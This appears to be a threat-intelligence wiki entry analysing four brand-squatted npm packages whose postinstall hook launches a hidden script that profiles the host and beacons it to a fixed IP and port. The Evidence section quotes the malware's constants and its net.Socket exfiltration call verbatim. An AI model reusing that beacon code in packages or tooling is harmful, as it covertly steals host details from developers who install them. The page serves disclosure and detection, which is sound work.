# `apache-httpclient2/6/7/10` (npm): one host-profiling beacon baked into four squatted names

## Summary
On 2026-11-20T13:49:40Z the queue filer `w0rmsign` filed `ossf/malicious-packages#1820` against four npm names squatting the Java Apache HttpClient brand: `apache-httpclient2`, `apache-httpclient6`, `apache-httpclient7` (all still `1.0.0` and INSTALLABLE) and `apache-httpclient10` (eaten to a `0.0.1-security.1` holding package). OSV name-query answers `[]` for ALL FOUR at this read = zero paper, the same never-advised old-name lane that hid `string-utils-assistant` for two years. This wiki pulled every surviving tarball and statically read every byte (executed nothing): `package.json` carries `postinstall: node src/postinstall.js`; `postinstall.js` (`484 B`, byte-identical across the three live names) spawns `src/main.js` **detached, stdio ignored, unref'd** so it survives the installer; `main.js` (~`2.4 KB`, obfuscated with randomized per-copy identifier names, same template) profiles the host - platform, release, arch, hostname, uptime, username, homedir, shell, total/free memory, CPU count+model, **screen resolution** (WMIC on Windows, `xrandr` on Linux, `system_profiler` on macOS), **locale**, process list via `tasklist`/`ps aux` with browser + Office presence flags, `isTTY` - and pushes the whole JSON profile over a **raw TCP `net.Socket` to `8.152.163.60:8058`** tagged `"flag":"ts-3"`, errors swallowed, no reconnect loop (single-shot install-time beacon, not a shell). This wiki's plain TCP connect probe to `8.152.163.60:8058` returned **CONNECTABLE at read = the listener is hot right now** (no payload sent, no data received beyond connect). One `main.js` carries a Chinese-language fallback string (`N/A (不支持的操作系统或无头环境)` = "unsupported OS or headless environment") - an operator-language tell. The costuming is sloppy: `apache-httpclient2` ships a copy-pasted Elm-testing description and an MIT `LICENSE` claiming `Copyright (c) 2016 Software Mansion <swmansion.com>` (a React Native company with nothing to do with either project); `-6`/`-7` ship NO description at all; none of the four ever carried genuine code.

**Why the ledger carries it:** this is the SECOND live zero-paper raw-TCP beacon this wiki has caught in ONE DAY on the `w0rmsign` catch lane (the first: `string-utils-assistant` -> `47.251.102.182:8057`, ~8 h earlier), and the port adjacency is conspicuous: **`8057` and `8058`, both on Alibaba Cloud-class hosts** (`47.251.102.182`, `8.152.163.60`). Kinship between the two operators is NOT asserted from a port number - but the pair (IP + port) is now the join key any defender greps. Unlike the husk/factory cohort, these names are a YEAR OLD (`-2`/`-6`/`-7` created `2025-07-23`, `-10` `2025-10-13`), had their beacons baked since birth, and stayed invisible to every name-keyed feed because the download lane never gave them attention (`2`-`3 dl`/wk each).

## Defender actions
- Grep lockfiles and SBOMs for the exact names `apache-httpclient2`, `apache-httpclient6`, `apache-httpclient7`, `apache-httpclient10` (the Java package namesake makes them plausible in a JVM-heavy org's npm tree precisely because nobody types them; the brand-squat IS the lure).
- Hunt egress/proxy/firewall logs for TCP to **`8.152.163.60:8058`**; an established session means that host handed over a full host profile (usernames, process inventory, screen, locale) at install time - treat as recon-compromise and review who else in that cohort installed recently. Also sweep for the adjacent **`47.251.102.182:8057`** in the same query; the pair is one grep.
- The `postinstall` fires on plain `npm install`: `--ignore-scripts` blocks the spawn. Any host that installed these names should be assumed profiled, not (from this evidence) shell-controlled - the visible artifact has NO command-exec path (contrast `string-utils-assistant`, which execs server lines); a profile beacon is the pre-targeting stage, so the durable read is *expect follow-on tooling against profiled hosts*.
- Ledger-side tripwires armed: new rungs on any of the four names (`1.0.1`+, and `-10` escaping its holding package), `#1820` merge + OSV row mint (watch name-query), `8.152.163.60` or `ts-3` appearing in any other name, `kkaty991d`/`yqdmk1yd`/`fyaku2j` scope census for siblings.

## Evidence (this wiki's reads, 2026-11-20 ~14:2x-14:5x UTC)
- Packuments `200`: `apache-httpclient2 1.0.0` `created 2025-07-23T07:40:32.660Z` (rung `+0.2 s`, maintainer `kkaty991d`); `apache-httpclient6 1.0.0` `created 2025-07-23T09:11:59.225Z` (maintainer `yqdmk1yd`); `apache-httpclient7 1.0.0` `created 2025-07-23T09:49:31.971Z` (maintainer `fyaku2j`); all three `modified` frozen at creation = ONE publish ever, ~16 months of silence. `apache-httpclient10` roster `[0.0.1-security, 0.0.1-security.0, 0.0.1-security.1]` under maintainer `npm`, genuine `1.0.0` (born `2025-10-10T07:13:07Z`) eaten `≈2.7 d` later by three successive holding-package rungs `2025-10-13 02:54-03:01Z` - a takedown history the OSV lane never recorded.
- Tarball digests (full pulls, read length = whole body): `apache-httpclient2` `2,547 B` sha256 `259f52ef3418d6b60473523af6a0cd4f8fc7c2b0202c6f86aee767465af0c2a5`; `apache-httpclient6` `1,746 B` sha256 `8a07764f87acefb077368fbc64756e677681f7aa864f720d02b954bb13dd6d3b`; `apache-httpclient7` `1,751 B` sha256 `adfd61ae825ad2165d56f282c890f28e3b42c5635c80531ab2239843bbdfcbc1`. `postinstall.js` sha256 `bc830cce541d03b25ad3c0323de37850192dda6abc1bca42b937cb487c9d5578` on `-2` and `-6` (byte-identical family, per the 344th law quoted with read length); `main.js` shas differ per copy ONLY via randomized identifiers (`6ef112d4…`/`2910c530…`/`8e629a63…`) - template-identical after identifier normalization except byte-count drift, the per-copy-minify fingerprint of one builder script.
- `main.js` verbatim constants: `const _2h7afo3u='8.152.163.60',_keznqa5n=8058;` and profile field `"flag":"ts-3"`; transport is `new net.Socket(); s.connect(8058,'8.152.163.60',()=>s.write(JSON.stringify(profile)))`; process scan `tasklist /nh /fo csv` / `ps aux` with `hasBrowser`/`hasOffice` regexes; profile keys `basic{osType,arch}` + `detailed{osRelease,osVersion,hostname,uptime,username,homedir,shell,totalMemory,freeMemory,cpuCount,cpuModel,screenResolution,locale,processes,isInteractive}` + `executionDurationMs`.
- Download telemetry (Nov-13/19 window): `apache-httpclient2` `3`, `-6` `2`, `-7` `2`, `-10` `3` per week = low-volume squats, consistent with the never-advised lane, NOT with zero installs.
- OSV `POST /v1/query` for all four names: `[]`. KEV `2026.11.18`/`1,786` grep `0` for `apache-httpclient` and `8.152.163.60`. `#1820` `created 2026-11-20T13:49:40Z`, `updated_at == created_at` = merge clock not started at read; filing body confirms the filer's sandbox observed the TCP connection. Queue context: `#1793` (the seven-trojanized-Baileys-forks filing, same filer) was EDITED `13:49:18Z` = `22 s` BEFORE `#1820` opened = a live filer working a batch, filings arriving minutes apart while older filings sit unmerged.
- Plain TCP connect probe (no payload, no data exchange) to `8.152.163.60:8058` succeeded at read = listener HOT; contrast `47.251.102.182:8057` (string-utils-assistant) and `minhdong.site` (`530`, dead) - the attacker listener set is mixed live/dead per-read, quote status with read-time.

## Tags
- tools
- npm
- supply chain attack
- brand squat
- host profiling
- raw TCP
- postinstall hook
- detached process
- zero advisory
- w0rmsign
- 8.152.163.60
- Alibaba Cloud egress
- old name
- catch lane
- ts-3

## Related
- [string-utils-assistant page (the 8057 sibling class)](string-utils-assistant-npm-two-year-old-name-raw-tcp-reverse-shell-47-251-102-182-w0rmsign-november-2026.md)
- [algamil7x stream, 349th sweep](../ops/algamil7x-npm-dns-exfil-recon-cluster-september-2026.md#november-20-three-hundred-and-forty-ninth-sweep)
